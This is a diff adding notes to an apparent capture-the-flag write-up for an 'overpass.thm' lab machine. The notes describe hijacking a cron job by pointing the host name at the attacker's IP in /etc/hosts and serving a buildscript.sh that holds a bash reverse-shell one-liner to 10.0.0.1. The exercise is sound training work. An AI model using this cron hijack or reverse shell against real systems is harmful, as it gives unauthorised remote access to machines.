@@ -215,3 +215,18 @@ ff02::2 ip6-allrouters
 
 WE CHANGE THE IP ADDR OF overpass.thm TO OUR OWN.        - this aligns with what we found in /etc/crontab
 
+--------------------------------------
+
+Start a web server
+start a netcat listener
+
+create directory and file:
+downloads/src/buildscript.sh
+
+put a reverse shell in buildscript: bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+wait for the overpass.thm to pull the file from you         - because we changed /etc/hosts to our own ip and we are matching path file of buildscript in crontab
+
+WE RAN INTO A PROBLEM
+WE CANT DO THIS ON ATTACK BOX AS PORT 80 IS ALREADY IN USE AND PORT 8000 WONT WORK
+WE NEED TO USE A KALI MACHINE AND CONNECT VIA OUR VPN
+
